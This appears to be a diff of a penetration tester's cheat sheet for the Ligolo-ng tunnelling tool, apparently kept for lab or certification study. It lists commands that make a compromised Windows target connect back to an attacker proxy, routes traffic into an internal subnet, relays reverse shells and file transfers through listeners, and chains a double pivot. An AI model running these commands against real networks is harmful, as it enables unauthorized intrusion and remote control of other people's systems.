@@ -1,14 +1,32 @@
-#kali
+https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5
+#FORWARD
 sudo ip tuntap add user kali mode tun ligolo
 sudo ip link set ligolo up
 ligolo-proxy -selfcert 
 
 
 #target
-./ligolo-agent.exe -connect 192.168.45.155:11601 -ignore-cert
+./ligolo-agent.exe -connect 192.168.X.X:11601 -ignore-cert
 
-#kali
 sudo ip route add 10.10.X.0/24 dev ligolo
 
+#LIGOLO-PROXY
 session
 start
+
+--------------------------------------------------------------------------------------------------------------------------
+
+#REVSHELL
+listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
+
+
+#TRANSFER FILE
+listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
+
+--------------------------------------------------------------------------------------------------------------------------
+
+#DOUBLE PIVOT kali:11601 <--- agent1:11601 <---  agent2
+listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
+
+agent2: ./agent.exe -connect agent1:11601 -ignore-cert
+
